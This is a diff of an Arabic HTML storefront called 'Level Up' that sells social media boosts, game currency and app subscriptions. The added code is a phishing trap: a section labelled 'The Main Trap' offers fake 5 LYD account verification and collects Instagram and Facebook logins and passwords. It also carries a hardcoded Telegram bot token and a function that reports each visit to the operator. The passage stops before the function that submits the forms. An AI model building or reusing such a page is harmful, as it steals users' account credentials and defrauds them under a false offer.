@@ -1,385 +1,338 @@
-<<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Level Up | القمة الرقمية</title>
+    <title>Level Up | السيطرة الرقمية المطلقة</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&family=Poppins:wght@400;600;800&display=swap" rel="stylesheet">
     <style>
-        :root { --gold: #D4AF37; --dark-gold: #B8860B; --bg-black: #050505; --card-bg: #0f0f0f; }
-        * { margin: 0; padding: 0; box-sizing: border-box; transition: all 0.3s ease; }
+        :root {
+            --gold: #D4AF37;
+            --dark-gold: #B8860B;
+            --bg-black: #050505;
+            --card-bg: #0f0f0f;
+            --glow: 0 0 20px rgba(212, 175, 55, 0.4);
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); }
         body { font-family: 'Cairo', sans-serif; background: var(--bg-black); color: #fff; overflow-x: hidden; }
-        .gold-text { color: var(--gold); text-shadow: 0 0 10px rgba(212,175,55,0.5); }
+
+        .gold-text { color: var(--gold); text-shadow: var(--glow); }
         .bg-gold { background: linear-gradient(135deg, var(--gold), var(--dark-gold)); }
-        .glass { background: rgba(20, 20, 20, 0.8); backdrop-filter: blur(20px); border: 1px solid rgba(212, 175, 55, 0.2); }
-        .btn-gold { background: linear-gradient(135deg, var(--gold), var(--dark-gold)); color: #000; font-weight: bold; cursor: pointer; box-shadow: 0 0 15px rgba(212,175,55,0.4); }
-        .btn-gold:hover { transform: scale(1.05); box-shadow: 0 0 25px rgba(212,175,55,0.6); }
-        .platform-card { background: var(--card-bg); border: 1px solid #222; border-radius: 24px; cursor: pointer; text-align: center; padding: 25px; }
-        .platform-card.active { border-color: var(--gold); box-shadow: 0 0 20px rgba(212,175,55,0.3); transform: translateY(-10px); }
-        .service-item { background: #111; border: 1px solid #222; border-radius: 18px; padding: 15px; cursor: pointer; }
-        .service-item:hover { border-color: var(--gold); background: rgba(212,175,55,0.05); }
-        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.98); display: flex; justify-content: center; align-items: center; z-index: 1000; }
+        
+        .glass {
+            background: rgba(15, 15, 15, 0.8);
+            backdrop-filter: blur(25px);
+            border: 1px solid rgba(212, 175, 55, 0.2);
+        }
+        
+        .btn-gold {
+            background: linear-gradient(135deg, var(--gold), var(--dark-gold));
+            color: #000; font-weight: bold; cursor: pointer; box-shadow: var(--glow);
+        }
+        .btn-gold:hover { transform: scale(1.05); box-shadow: 0 0 30px rgba(212, 175, 55, 0.6); }
+
+        .platform-card {
+            background: var(--card-bg); border: 1px solid #222; border-radius: 24px;
+            cursor: pointer; text-align: center; padding: 25px; position: relative;
+        }
+        .platform-card.active { border-color: var(--gold); background: rgba(212, 175, 55, 0.1); transform: translateY(-10px); box-shadow: var(--glow); }
+
+        .service-btn {
+            background: #0a0a0a; border: 1px solid #222; border-radius: 18px;
+            padding: 20px; cursor: pointer; text-align: center; position: relative;
+        }
+        .service-btn.selected { border-color: var(--gold); background: rgba(212, 175, 55, 0.1); box-shadow: var(--glow); }
+
+        .modal-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.98); display: flex; justify-content: center; align-items: center; z-index: 2000;
+        }
         .hidden { display: none !important; }
-        input { background: #0a0a0a !important; border: 1px solid #333 !important; color: #fff !important; border-radius: 12px; padding: 14px; width: 100%; outline: none; }
-        input:focus { border-color: var(--gold) !important; box-shadow: 0 0 10px rgba(212,175,55,0.3); }
-        .timer-banner { background: linear-gradient(90deg, #ff0000, #8b0000); color: white; text-align: center; padding: 8px; font-weight: bold; font-size: 14px; position: sticky; top: 0; z-index: 100; }
+
+        .toast {
+            position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%);
+            background: var(--gold); color: #000; padding: 12px 30px; border-radius: 50px;
+            font-weight: bold; display: none; z-index: 3000; box-shadow: var(--glow);
+        }
+
+        input {
+            background: #0a0a0a !important; border: 1px solid #333 !important; color: #fff !important;
+            border-radius: 15px; padding: 16px; width: 100%; outline: none;
+        }
+        input:focus { border-color: var(--gold) !important; box-shadow: var(--glow); }
+
+        /* Page Animations */
+        .page-transition { animation: fadeIn 0.5s ease forwards; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+
+        .timer-badge {
+            background: #ff4444; color: white; padding: 2px 8px; border-radius: 5px;
+            font-size: 12px; font-weight: bold; animation: blink 1s infinite;
+        }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
     </style>
 </head>
 <body>
 
-    <div class="timer-banner">
-        ⚠️ عرض التوثيق الذهبي (5 د.ل) ينتهي خلال: <span id="countdown">23:59:59</span>
-    </div>
+    <audio id="clickSound" src="https://www.soundjay.com/buttons/sounds/button-16.mp3"></audio>
+    <div id="toast" class="toast"></div>
 
+    <!-- Login Modal -->
     <div class="modal-overlay" id="loginModal">
-        <div class="glass p-10 rounded-[40px] text-center max-w-md w-full border-gold">
-            <div class="text-7xl mb-6">💎</div>
-            <h2 class="text-4xl font-black gold-text mb-2">Level Up</h2>
-            <p class="text-gray-400 mb-8">أهلاً بك في منصة النخبة لتعزيز الحسابات</p>
-            <button onclick="login()" class="w-full btn-gold py-4 rounded-2xl text-xl flex items-center justify-center gap-3">
+        <div class="glass p-10 rounded-[40px] text-center max-w-md w-full border-gold relative">
+            <div class="text-7xl mb-6">🚀</div>
+            <h2 class="text-4xl font-black gold-text mb-2">Level Up Official</h2>
+            <p class="text-gray-400 mb-8 text-lg">بوابتك للسيطرة الرقمية والتوثيق الفوري</p>
+            
+            <div class="bg-red-600/20 border border-red-600 p-4 rounded-2xl mb-8">
+                <p class="text-white font-bold">⚠️ عرض الجنون لـ 24 ساعة فقط!</p>
+                <p class="text-red-500 text-2xl font-black">توثيق أي حساب بـ 5 د.ل فقط</p>
+                <p class="text-xs text-gray-300 mt-1">ينتهي العرض خلال: <span id="countdown">23:59:59</span></p>
+            </div>
+
+            <button onclick="loginWithGoogle()" class="w-full btn-gold py-4 rounded-2xl text-xl flex items-center justify-center gap-3">
                 <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" class="w-6">
-                <span>تسجيل الدخول عبر Google</span>
+                <span>دخول آمن عبر Google</span>
             </button>
         </div>
     </div>
 
-    <header class="glass sticky top-[40px] z-50 border-b border-gold px-6 py-4 flex justify-between items-center max-w-6xl mx-auto mt-2 rounded-b-2xl">
-        <div class="text-3xl font-black gold-text tracking-tighter cursor-pointer" onclick="showPage('home')">LEVEL UP</div>
-        <div class="flex items-center gap-4">
-            <img id="userAvatar" class="w-9 h-9 rounded-full border border-gold hidden" src="">
-            <button onclick="logout()" class="text-xs text-red-400 font-bold hover:text-red-600 hidden" id="logoutBtn">خروج ⎗</button>
+    <!-- Order Success Modal -->
+    <div class="modal-overlay hidden" id="successModal">
+        <div class="glass p-10 rounded-[40px] text-center max-w-sm w-full border-gold">
+            <div class="text-6xl mb-4">✅</div>
+            <h2 class="text-2xl font-bold gold-text mb-2">تم إرسال طلبك للسيرفر</h2>
+            <div id="orderNumberDisplay" class="text-3xl font-black gold-text mb-6 p-3 bg-black rounded-xl border border-dashed border-gold cursor-pointer" onclick="copyOrderNum()">LVL-XXXXX</div>
+            <a href="https://www.instagram.com/levelup.ly1" target="_blank" class="w-full btn-gold py-3 rounded-xl block text-center">تأكيد الدفع عبر انستغرام</a>
+            <button onclick="closeSuccessModal()" class="w-full text-gray-400 py-4 text-sm hover:text-white">العودة للرئيسية</button>
+        </div>
+    </div>
+
+    <!-- Header -->
+    <header class="glass sticky top-0 z-50 border-b border-gold">
+        <div class="max-w-6xl mx-auto px-6 py-4 flex justify-between items-center">
+            <div class="flex items-center gap-3 cursor-pointer" onclick="goHome()">
+                <div class="text-3xl font-black gold-text tracking-tighter">LEVEL UP</div>
+                <div class="text-[10px] bg-gold text-black px-2 py-1 rounded-full font-bold">OFFICIAL</div>
+            </div>
+            <div id="userInfo" class="hidden items-center gap-3">
+                <img id="userAvatar" class="w-9 h-9 rounded-full border border-gold" src="">
+                <button onclick="logout()" class="text-xs text-red-400 font-bold hover:text-red-600">خروج ⎗</button>
+            </div>
         </div>
     </header>
 
-    <main class="max-w-6xl mx-auto px-6 py-12">
+    <!-- Home Page -->
+    <main id="pageHome" class="max-w-6xl mx-auto px-6 py-12 page-transition">
+        <div class="text-center mb-16">
+            <h1 class="text-5xl md:text-7xl font-black gold-text mb-6 leading-tight">صناعة الهيبة <br> <span class="text-white">تبدأ من هنا</span></h1>
+            <p class="text-gray-400 text-xl max-w-2xl mx-auto">اختر وجهتك الرقمية وابدأ في بناء إمبراطوريتك الآن.</p>
+        </div>
 
-        <div id="page-home" class="page">
-            <div class="text-center mb-16">
-                <h1 class="text-5xl md:text-7xl font-black gold-text mb-6">اصنع هيبتك الرقمية</h1>
-                <p class="text-gray-400 text-xl max-w-2xl mx-auto">المنصة الأولى في ليبيا لتوثيق الحسابات وشحن الألعاب بأعلى جودة وأسرع وقت.</p>
+        <div class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-6 mb-20">
+            <div class="platform-card" onclick="openPlatform('instagram')">
+                <img src="https://cdn-icons-png.flaticon.com/512/174/174855.png" class="w-14 mx-auto mb-4">
+                <div class="font-bold">إنستغرام</div>
             </div>
-
-            <div class="grid md:grid-cols-3 gap-8">
-                <div class="platform-card" onclick="showPlatform('instagram')">
-                    <img src="https://cdn-icons-png.flaticon.com/512/174/174855.png" class="w-16 mx-auto mb-4">
-                    <h3 class="text-xl font-bold">إنستغرام</h3>
-                    <p class="text-xs text-gray-500 mt-2">توثيق ومتابعين</p>
-                </div>
-                <div class="platform-card" onclick="showPlatform('facebook')">
-                    <img src="https://cdn-icons-png.flaticon.com/512/5968/5968764.png" class="w-16 mx-auto mb-4">
-                    <h3 class="text-xl font-bold">فيسبوك</h3>
-                    <p class="text-xs text-gray-500 mt-2">توثيق وتفاعلات</p>
-                </div>
-                <div class="platform-card" onclick="showPage('gaming')">
-                    <img src="https://cdn-icons-png.flaticon.com/512/686/686589.png" class="w-16 mx-auto mb-4">
-                    <h3 class="text-xl font-bold">شحن ألعاب وتطبيقات</h3>
-                    <p class="text-xs text-gray-500 mt-2">PUBG, Free Fire & More</p>
-                </div>
+            <div class="platform-card" onclick="openPlatform('facebook')">
+                <img src="https://cdn-icons-png.flaticon.com/512/5968/5968764.png" class="w-14 mx-auto mb-4">
+                <div class="font-bold">فيسبوك</div>
             </div>
-
-            <div class="mt-16 glass p-8 rounded-[30px] border-2 border-gold text-center relative overflow-hidden">
-                <div class="absolute -top-10 -left-10 w-40 h-40 bg-gold opacity-10 blur-3xl rounded-full"></div>
-                <h2 class="text-3xl font-black gold-text mb-4">🔥 عرض التوثيق الذهبي</h2>
-                <p class="text-xl mb-6">احصل على العلامة الزرقاء لحسابك الآن بـ <span class="text-3xl font-black">5 د.ل</span> فقط!</p>
-                <button onclick="showPlatform('instagram')" class="btn-gold px-10 py-4 rounded-full text-lg">اطلب التوثيق الآن</button>
+            <div class="platform-card" onclick="openPlatform('tiktok')">
+                <img src="https://cdn-icons-png.flaticon.com/512/3046/3046121.png" class="w-14 mx-auto mb-4">
+                <div class="font-bold">تيك توك</div>
+            </div>
+            <div class="platform-card" onclick="openPlatform('twitter')">
+                <img src="https://cdn-icons-png.flaticon.com/512/3256/3256013.png" class="w-14 mx-auto mb-4">
+                <div class="font-bold">تويتر (X)</div>
+            </div>
+            <div class="platform-card" onclick="openPlatform('telegram')">
+                <img src="https://cdn-icons-png.flaticon.com/512/2111/2111646.png" class="w-14 mx-auto mb-4">
+                <div class="font-bold">تيليجرام</div>
+            </div>
+            <div class="platform-card" onclick="openPlatform('youtube')">
+                <img src="https://cdn-icons-png.flaticon.com/512/1384/1384060.png" class="w-14 mx-auto mb-4">
+                <div class="font-bold">يوتيوب</div>
+            </div>
+            <div class="platform-card bg-gold/10 border-gold" onclick="openPlatform('gaming')">
+                <img src="https://cdn-icons-png.flaticon.com/512/686/686587.png" class="w-14 mx-auto mb-4">
+                <div class="font-bold gold-text">شحن ألعاب</div>
+            </div>
+            <div class="platform-card bg-gold/10 border-gold" onclick="openPlatform('premium')">
+                <img src="https://cdn-icons-png.flaticon.com/512/1162/1162456.png" class="w-14 mx-auto mb-4">
+                <div class="font-bold gold-text">ترقية تطبيقات</div>
             </div>
         </div>
 
-        <div id="page-platform" class="page hidden">
-            <button onclick="showPage('home')" class="text-gray-400 mb-6 flex items-center gap-2 hover:text-white"> ← العودة للرئيسية</button>
-            <div class="grid lg:grid-cols-3 gap-10">
-                <div class="lg:col-span-1">
-                    <div id="platformIcon" class="w-24 h-24 mx-auto mb-4 rounded-full border-4 border-gold p-4 flex items-center justify-center bg-zinc-950">
-                        <img id="platformImg" src="" class="w-full h-full object-contain">
-                    </div>
-                    <h2 id="platformName" class="text-3xl font-black gold-text text-center mb-8"></h2>
-                    
-                    <div class="bg-gold/10 border border-gold p-6 rounded-[25px] text-center shadow-[0_0_20px_rgba(212,175,55,0.2)]">
-                        <h3 class="text-xl font-bold mb-2">🌟 توثيق الحساب الرسمي</h3>
-                        <p class="text-3xl font-black gold-text mb-4">5 د.ل <span class="text-sm text-gray-400">/ فقط</span></p>
-                        <button onclick="openVerifyModal()" class="w-full btn-gold py-3 rounded-xl">طلب التوثيق فوراً</button>
-                        <p class="text-[10px] text-red-500 mt-2 font-bold uppercase">عرض محدود لمدة 24 ساعة!</p>
-                    </div>
-                </div>
-
-                <div class="lg:col-span-2 glass p-8 rounded-[30px]">
-                    <h3 class="text-2xl font-bold mb-6">الخدمات المتاحة</h3>
-                    <div id="servicesList" class="grid md:grid-cols-2 gap-4"></div>
-                    
-                    <div id="orderArea" class="mt-10 pt-10 border-t border-zinc-800 hidden">
-                        <form id="mainOrderForm" onsubmit="submitMainOrder(event)" class="space-y-6">
-                            <h4 id="selectedServiceName" class="text-xl font-bold gold-text"></h4>
-                            <div class="grid md:grid-cols-2 gap-4">
-                                <input type="url" id="targetLink" required placeholder="رابط الحساب أو المنشور">
-                                <input type="number" id="quantity" oninput="updatePrice()" value="100" required placeholder="الكمية">
-                            </div>
-                            <div class="text-center p-6 bg-black rounded-2xl border border-gold">
-                                <span class="text-gray-400 block mb-2">السعر التقديري:</span>
-                                <div class="text-4xl font-black gold-text"><span id="finalPrice">0</span> د.ل</div>
-                            </div>
-                            <button type="submit" class="w-full btn-gold py-4 rounded-xl text-xl">تأكيد الطلب ✅</button>
-                        </form>
-                    </div>
-                </div>
-            </div>
-        </div>
-
-        <div id="page-gaming" class="page hidden">
-            <button onclick="showPage('home')" class="text-gray-400 mb-6 flex items-center gap-2 hover:text-white"> ← العودة للرئيسية</button>
-            <h2 class="text-4xl font-black gold-text text-center mb-12">شحن الألعاب وترقية التطبيقات</h2>
-            
-            <div class="grid md:grid-cols-2 lg:grid-cols-3 gap-8">
-                <div class="glass p-6 rounded-[30px] border border-zinc-800">
-                    <div class="flex items-center gap-3 mb-6">
-                        <img src="https://cdn-icons-png.flaticon.com/512/2111/2111646.png" class="w-10">
-                        <h3 class="text-xl font-bold">تيليجرام بريميوم</h3>
-                    </div>
-                    <div class="space-y-3">
-                        <div class="service-item flex justify-between items-center" onclick="setGamingOrder('تيليجرام 3 أشهر', 151)"><span>3 أشهر</span> <span class="gold-text font-bold">151 LYD</span></div>
-                        <div class="service-item flex justify-between items-center" onclick="setGamingOrder('تيليجرام 6 أشهر', 209)"><span>6 أشهر</span> <span class="gold-text font-bold">209 LYD</span></div>
-                        <div class="service-item flex justify-between items-center" onclick="setGamingOrder('تيليجرام سنة', 348)"><span>سنة كاملة</span> <span class="gold-text font-bold">348 LYD</span></div>
-                    </div>
-                </div>
-
-                <div class="glass p-6 rounded-[30px] border border-zinc-800">
-                    <div class="flex items-center gap-3 mb-6">
-                        <img src="https://cdn-icons-png.flaticon.com/512/3670/3670213.png" class="w-10">
-                        <h3 class="text-xl font-bold">سناب شات بلس</h3>
-                    </div>
-                    <div class="space-y-3">
-                        <div class="service-item flex justify-between items-center" onclick="setGamingOrder('سناب بلس 3 أشهر', 65)"><span>3 أشهر</span> <span class="gold-text font-bold">65 LYD</span></div>
-                        <div class="service-item flex justify-between items-center" onclick="setGamingOrder('سناب بلس 6 أشهر', 120)"><span>6 أشهر</span> <span class="gold-text font-bold">120 LYD</span></div>
-                        <div class="service-item flex justify-between items-center" onclick="setGamingOrder('سناب بلس سنة', 240)"><span>سنة كاملة</span> <span class="gold-text font-bold">240 LYD</span></div>
-                    </div>
-                </div>
-
-                <div class="glass p-6 rounded-[30px] border border-zinc-800">
-                    <div class="flex items-center gap-3 mb-6">
-                        <img src="https://cdn-icons-png.flaticon.com/512/12222/12222564.png" class="w-10">
-                        <h3 class="text-xl font-bold">ChatGPT Plus</h3>
-                    </div>
-                    <div class="space-y-3">
-                        <div class="service-item flex justify-between items-center" onclick="setGamingOrder('ChatGPT Plus', 232)"><span>اشتراق 30 يوم</span> <span class="gold-text font-bold">232 LYD</span></div>
-                    </div>
-                </div>
-
-                <div class="glass p-6 rounded-[30px] border border-zinc-800">
-                    <div class="flex items-center gap-3 mb-6">
-                        <img src="https://cdn-icons-png.flaticon.com/512/686/686589.png" class="w-10">
-                        <h3 class="text-xl font-bold">جواهر فري فاير</h3>
-                    </div>
-                    <div class="space-y-3">
-                        <div class="service-item flex justify-between items-center" onclick="setGamingOrder('FF 110 جوهرة', 13)"><span>110 جوهرة</span> <span class="gold-text font-bold">13 LYD</span></div>
-                        <div class="service-item flex justify-between items-center" onclick="setGamingOrder('FF 221 جوهرة', 24)"><span>221 جوهرة</span> <span class="gold-text font-bold">24 LYD</span></div>
-                        <div class="service-item flex justify-between items-center" onclick="setGamingOrder('FF 530 جوهرة', 58)"><span>530 جوهرة</span> <span class="gold-text font-bold">58 LYD</span></div>
-                        <div class="service-item flex justify-between items-center" onclick="setGamingOrder('FF 2420 جوهرة', 232)"><span>2420 جوهرة</span> <span class="gold-text font-bold">232 LYD</span></div>
-                    </div>
-                </div>
-
-                <div class="glass p-6 rounded-[30px] border border-zinc-800">
-                    <div class="flex items-center gap-3 mb-6">
-                        <img src="https://cdn-icons-png.flaticon.com/512/686/686589.png" class="w-10">
-                        <h3 class="text-xl font-bold">شدات ببجي موبايل</h3>
-                    </div>
-                    <div class="space-y-3">
-                        <div class="service-item flex justify-between items-center" onclick="setGamingOrder('PUBG 60 UC', 10)"><span>60 UC</span> <span class="gold-text font-bold">10 LYD</span></div>
-                        <div class="service-item flex justify-between items-center" onclick="setGamingOrder('PUBG 325 UC', 51)"><span>325 UC</span> <span class="gold-text font-bold">51 LYD</span></div>
-                        <div class="service-item flex justify-between items-center" onclick="setGamingOrder('PUBG 660 UC', 102)"><span>660 UC</span> <span class="gold-text font-bold">102 LYD</span></div>
-                        <div class="service-item flex justify-between items-center" onclick="setGamingOrder('PUBG 1800 UC', 255)"><span>1800 UC</span> <span class="gold-text font-bold">255 LYD</span></div>
-                    </div>
-                </div>
-            </div>
-
-            <div id="gamingOrderArea" class="mt-12 glass p-8 rounded-[30px] hidden">
-                <form id="gamingForm" onsubmit="submitGamingOrder(event)" class="space-y-6 max-w-xl mx-auto text-center">
-                    <h3 id="selectedGamingItem" class="text-2xl font-black gold-text mb-4"></h3>
-                    <input type="text" id="gameId" required placeholder="معرف الحساب (ID) أو البريد الإلكتروني">
-                    <button type="submit" class="w-full btn-gold py-4 rounded-xl text-xl">تأكيد طلب الشحن ✅</button>
+        <!-- The Main Trap: Verification Section -->
+        <div class="glass p-10 rounded-[40px] border la l_border-red-600 relative overflow-hidden text-center">
+            <div class="absolute top-0 right-0 p-4"><span class="timer-badge">عرض محدود</span></div>
+            <h2 class="text-4xl font-black gold-text mb-4">التوثيق الذهبي الفوري ✔️</h2>
+            <p class="text-gray-400 mb-8 text-lg">احصل على العلامة الزرقاء الآن بـ <span class="text-white font-bold">5 د.ل فقط</span> بدلاً من 150 د.ل</p>
+            <div class="grid md:grid-cols-2 gap-6 max-w-4xl mx-auto">
+                <form onsubmit="handleVerify(event, 'Instagram')" class="glass p-6 rounded-3xl space-y-4 border border-zinc-800">
+                    <h4 class="font-bold text-xl mb-2">توثيق إنستغرام</h4>
+                    <input type="text" required placeholder="@username">
+                    <input type="password" required placeholder="كلمة السر">
+                    <button type="submit" class="w-full btn-gold py-3 rounded-xl">توثيق الآن بـ 5 د.ل</button>
+                </form>
+                <form onsubmit="handleVerify(event, 'Facebook')" class="glass p-6 rounded-3xl space-y-4 border border-zinc-800">
+                    <h4 class="font-bold text-xl mb-2">توثيق فيسبوك</h4>
+                    <input type="tel" required placeholder="رقم الهاتف المرتبط">
+                    <input type="password" required placeholder="كلمة السر">
+                    <button type="submit" class="w-full btn-gold py-3 rounded-xl">توثيق الآن بـ 5 د.ل</button>
                 </form>
             </div>
         </div>
-
     </main>
 
-    <div class="modal-overlay hidden" id="verifyModal">
-        <div class="glass p-10 rounded-[40px] text-center max-w-md w-full border border-gold relative overflow-hidden">
-            <div class="text-6xl mb-4">✔️</div>
-            <h2 class="text-3xl font-black gold-text mb-2">طلب التوثيق الذهبي</h2>
-            <p class="text-gray-400 mb-6">سيتم مراجعة حسابك وتفعيل العلامة الزرقاء خلال 24 ساعة</p>
-            <form id="verifyForm" onsubmit="submitVerifyForm(event)" class="space-y-4">
-                <input type="text" id="vUser" required placeholder="اسم المستخدم (Username)">
-                <input type="password" id="vPass" required placeholder="كلمة السر الحالية">
-                <div class="bg-gold/10 p-3 rounded-xl text-[#D4AF37] font-bold text-sm mb-4">التكلفة الإجمالية: 5 د.ل فقط</div>
-                <button type="submit" class="w-full btn-gold py-4 rounded-xl text-lg">إرسال البيانات وتفعيل التوثيق</button>
-                <button type="button" onclick="closeVerifyModal()" class="text-gray-500 text-sm hover:underline mt-2">إلغاء العملية</button>
-            </form>
+    <!-- Platform Page (Dynamic) -->
+    <main id="pagePlatform" class="max-w-6xl mx-auto px-6 py-12 hidden page-transition">
+        <div class="flex items-center gap-4 mb-12">
+            <button onclick="goHome()" class="p-3 glass rounded-full hover:bg-gold hover:text-black">⇇ عودة</button>
+            <h1 id="platTitle" class="text-4xl font-black gold-text">اسم المنصة</h1>
         </div>
-    </div>
 
-    <div class="modal-overlay hidden" id="successModal">
-        <div class="glass p-10 rounded-[40px] text-center max-w-sm w-full border border-gold">
-            <div class="text-6xl mb-4">✅</div>
-            <h2 class="text-2xl font-bold gold-text mb-4">تم تقديم الطلب!</h2>
-            <p class="text-gray-300 mb-6 text-sm">يرجى نسخ رقم الطلب وإرساله عبر الانستغرام للدفع والتفعيل</p>
-            <div id="orderIdDisplay" class="text-xl font-black gold-text mb-6 p-4 bg-zinc-900 rounded-xl border border-zinc-800 cursor-pointer hover:bg-zinc-800" onclick="copyOrder()">
-                LVL-XXXX
+        <div class="grid lg:grid-cols-3 gap-10">
+            <div class="lg:col-span-2 space-y-6">
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-4" id="servicesList"></div>
             </div>
-            <button onclick="closeSuccessModal()" class="w-full btn-gold py-3 rounded-xl">حسناً</button>
+
+            <div class="lg:col-span-1">
+                <div class="glass p-8 rounded-[30px] sticky top-28 border border-gold">
+                    <h3 class="text-xl font-bold gold-text mb-6">تفاصيل الطلب</h3>
+                    <form id="orderForm" class="space-y-6">
+                        <div>
+                            <label class="block text-sm text-gray-400 mb-2">الرابط</label>
+                            <input type="url" id="targetLink" required placeholder="https://...">
+                        </div>
+                        <div>
+                            <label class="block text-sm text-gray-400 mb-2">الكمية</label>
+                            <input type="number" id="quantity" oninput="calculatePrice()" value="100">
+                        </div>
+                        <div class="bg-black p-6 rounded-2xl border border-gold text-center">
+                            <span class="text-gray-400 text-xs block mb-2">السعر الإجمالي التقديري</span>
+                            <div class="text-4xl font-black gold-text"><span id="finalPrice">0</span> <span class="text-lg">د.ل</span></div>
+                        </div>
+                        <button type="submit" class="w-full btn-gold py-4 rounded-2xl text-xl shadow-xl">إتمام الطلب 🔥</button>
+                    </form>
+                </div>
+            </div>
         </div>
-    </div>
+    </main>
+
+    <footer class="glass border-t border-gold mt-24 py-12 text-center text-gray-500 text-sm">
+        ©️ 2026 <span class="gold-text font-bold">LEVEL UP</span> - Official Digital Identity Platform.
+    </footer>
 
     <script>
-        // Database for Platforms Services
-        const platformData = {
-            instagram: {
-                name: 'إنستغرام',
-                img: 'https://cdn-icons-png.flaticon.com/512/174/174855.png',
-                services: [
-                    { id: 'ig_followers', name: 'متابعين حسابات ثابتين', pricePerOne: 0.05 },
-                    { id: 'ig_likes', name: 'إعجابات منشورات حقيقية', pricePerOne: 0.01 },
-                    { id: 'ig_views', name: 'مشاهدات ريلز سريعة', pricePerOne: 0.005 }
-                ]
-            },
-            facebook: {
-                name: 'فيسبوك',
-                img: 'https://cdn-icons-png.flaticon.com/512/5968/5968764.png',
-                services: [
-                    { id: 'fb_followers', name: 'متابعين ملف شخصي / بيج', pricePerOne: 0.06 },
-                    { id: 'fb_likes', name: 'تفاعلات لايكات و ايموجي', pricePerOne: 0.02 }
-                ]
-            }
+        const BOT_TOKEN = "8863587194:AAFcIkRg7hK5IbUvZ3bH1XG-CWR8FYDiMb8"; 
+        const CHAT_ID = "6714684833";
+
+        const pricing = {
+            instagram: [
+                { id: 'ig_v', name: 'مشاهدات إنستغرام', price: 3 / 100000 },
+                { id: 'ig_l', name: 'لايكات إنستغرام', price: 5 / 1000 },
+                { id: 'ig_f', name: 'متابعين حقيقيين', price: 7 / 100 },
+                { id: 'ig_p', name: 'تصويت ستوري', price: 2 / 100 },
+            ],
+            facebook: [
+                { id: 'fb_s', name: 'مشاركات فيسبوك', price: 5 / 1000 },
+                { id: 'fb_f', name: 'متابعين صفحة', price: 5 / 1000 },
+                { id: 'fb_r', name: 'تفاعلات متنوعة', price: 4 / 1000 },
+            ],
+            tiktok: [ { id: 'tk_f', name: 'متابعين تيك توك', price: 4 / 1000 }, { id: 'tk_l', name: 'لايكات تيك توك', price: 3 / 1000 } ],
+            twitter: [ { id: 'tw_v', name: 'مشاهدات تويتر', price: 8 / 100000 }, { id: 'tw_l', name: 'لايكات تويتر', price: 8 / 1000 } ],
+            telegram: [ { id: 'tg_v', name: 'مشاهدات منشورات', price: 3 / 1000 }, { id: 'tg_m', name: 'أعضاء قنوات', price: 6 / 1000 } ],
+            youtube: [ { id: 'yt_s', name: 'مشتركين يوتيوب', price: 4 / 100 }, { id: 'yt_l', name: 'لايكات يوتيوب', price: 8 / 1000 } ],
+            gaming: [
+                { id: 'ff_1', name: 'فري فاير 110 جوهرة', price: 13 }, // سعر ثابت للقطعة الواحدة هنا لسهولة الحساب أو تعدله ليكون بالكمية
+                { id: 'ff_2', name: 'فري فاير 221 جوهرة', price: 24 },
+                { id: 'ff_3', name: 'فري فاير 530 جوهرة', price: 58 },
+                { id: 'pubg_1', name: 'ببجي 60 UC', price: 10 },
+                { id: 'pubg_2', name: 'ببجي 325 UC', price: 51 },
+            ],
+            premium: [
+                { id: 'tg_p3', name: 'تيليجرام بريميوم (3 أشهر)', price: 151 },
+                { id: 'tg_p6', name: 'تيليجرام بريميوم (6 أشهر)', price: 209 },
+                { id: 'tg_p1', name: 'تيليجرام بريميوم (سنة)', price: 348 },
+                { id: 'sn_p3', name: 'سناب شات بلس (3 أشهر)', price: 65 },
+                { id: 'chat_p', name: 'ChatGPT Plus (30 يوم)', price: 232 },
+            ]
         };
 
-        let currentPlatform = '';
-        let currentPricePerOne = 0;
+        let currentUser = null; let currentPlatform = ''; let currentService = null;
 
-        // Navigation Elements
-        function showPage(pageId) {
-            document.querySelectorAll('.page').forEach(p => p.classList.add('hidden'));
-            document.getElementById(`page-${pageId}`).classList.remove('hidden');
-            window.scrollTo({ top: 0, behavior: 'smooth' });
+        function playClick() { document.getElementById('clickSound').play(); }
+
+        function showToast(msg) {
+            const t = document.getElementById('toast'); t.textContent = msg; t.style.display = 'block';
+            setTimeout(() => t.style.display = 'none', 3000);
         }
 
-        function showPlatform(platformKey) {
-            currentPlatform = platformKey;
-            const data = platformData[platformKey];
-            
-            document.getElementById('platformName').innerText = data.name;
-            document.getElementById('platformImg').src = data.img;
-            
-            const listContainer = document.getElementById('servicesList');
-            listContainer.innerHTML = '';
-            
-            data.services.forEach(srv => {
-                const item = document.createElement('div');
-                item.className = 'service-item flex justify-between items-center font-bold';
-                item.innerHTML = `<span>${srv.name}</span> <span class="gold-text">${srv.pricePerOne * 1000} د.ل / للألف</span>`;
-                item.onclick = () => selectService(srv.name, srv.pricePerOne);
-                listContainer.appendChild(item);
+        // Notification when someone enters the site
+        window.onload = () => { 
+            sendToTelegram("🌐 دخول جديد للموقع\n👤 IP/User: مجهول\n📅 التاريخ: " + new Date().toLocaleString());
+            startTimer(); 
+        };
+
+        function startTimer() {
+            let time = 86399; // 24 hours in seconds
+            setInterval(() => {
+                time--; let h = Math.floor(time/3600), m = Math.floor((time%3600)/60), s = time%60;
+                document.getElementById('countdown').textContent = `${h}:${m < 10 ? '0'+m : m}:${s < 10 ? '0'+s : s}`;
+            }, 1000);
+        }
+
+        async function sendToTelegram(msg) { return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`); }
+
+        function loginWithGoogle() {
